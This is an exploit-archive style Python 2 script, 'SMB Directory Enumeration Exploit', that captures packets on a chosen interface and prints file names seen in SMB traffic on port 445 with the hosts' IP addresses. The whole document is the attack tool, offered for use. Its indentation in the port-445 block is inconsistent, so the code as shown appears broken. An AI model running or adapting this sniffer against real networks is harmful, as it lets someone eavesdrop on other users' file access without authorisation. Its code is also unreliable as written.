# Exploit Title: SMB Directory Enumeration Exploit
# Date: 08/04/2014
# Exploit Author: d0kt0r  (blog.vortextech.info/wp/)  
# Vendor Homepage: http://www.microsoft.com
# Version: SMBv1
# Tested on: Windows
# Author comment: Some bugs may be found, if you want to help contact me : admin@vortextech.info , check website for updates.

 
import socket
from struct import *
import datetime
import pcapy
import sys

already_seen = set()
 
def main(argv):
    devices = pcapy.findalldevs()
    print devices
    print '#################################################'
    print '##      SMB Directory Enumeration Exploit      ##'
    print '##  * Choose your device:                      ##'
    for d in devices :
        print '##> ' + d 
     
    dev = raw_input(";SYS Device: ")
     
    print ";SYS Sniffing device " + dev
     
    cap = pcapy.open_live(dev , 65536 , 1 , 0)

    while(1) :
        (header, packet) = cap.next()
        #print ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen()))
        #Uncomment if you want to see the output
        parse_packet(packet)
 
#Convert a string of 6 characters of ethernet address into a dash separated hex string
def eth_addr (a) :
    b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
    return b
 
#packet information
def parse_packet(packet) :
     
    #parse ethernet header
    eth_length = 14
     
    eth_header = packet[:eth_length]
    eth = unpack('!6s6sH' , eth_header)
    eth_protocol = socket.ntohs(eth[2])
    #print 'Destination MAC : ' + eth_addr(packet[0:6]) + ' Source MAC : ' + eth_addr(packet[6:12]) + ' Protocol : ' + str(eth_protocol)
 
    #Parse IP packets, IP Protocol number = 8
    if eth_protocol == 8 :
        #Parse IP header
        #take first 20 characters for the ip header
        ip_header = packet[eth_length:20+eth_length]
         
        #now unpack them :)
        iph = unpack('!BBHHHBBH4s4s' , ip_header)
 
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
 
        iph_length = ihl * 4
 
        ttl = iph[5]
        protocol = iph[6]
        s_addr = socket.inet_ntoa(iph[8]);
        d_addr = socket.inet_ntoa(iph[9]);
 
        #print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(s_addr) + ' Destination Address : ' + str(d_addr)
        #TCP protocol
        if protocol == 6 :
            t = iph_length + eth_length
            tcp_header = packet[t:t+20]
 
            #now unpack them :)
            tcph = unpack('!HHLLBBHHH' , tcp_header)
             
            source_port = tcph[0]
            dest_port = tcph[1]
            sequence = tcph[2]
            acknowledgement = tcph[3]
            doff_reserved = tcph[4]
            tcph_length = doff_reserved >> 4
            if str(source_port) == '445' or str(dest_port) == '445':             
		h_size = eth_length + iph_length + tcph_length * 4
		data_size = len(packet) - h_size
		if data_size > 90:
            #print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Sequence Number : ' + str(sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(tcph_length)
            #print '****************START PACKET*************************'
            #get data from the packet
            data = packet[h_size:]
            if data[8] == '2':
                #print 'FLAG:' + data[13]
                #print 'FLAG(HEX):' + data[13].encode('hex')
                if data[13].encode('hex') == '18':
                    nome_fic = data[75:250]
                    if nome_fic not in already_seen:
                        already_seen.add(nome_fic)
                        print '[F][' + str(s_addr) + ']>' +nome_fic 
 
if __name__ == "__main__":
  main(sys.argv)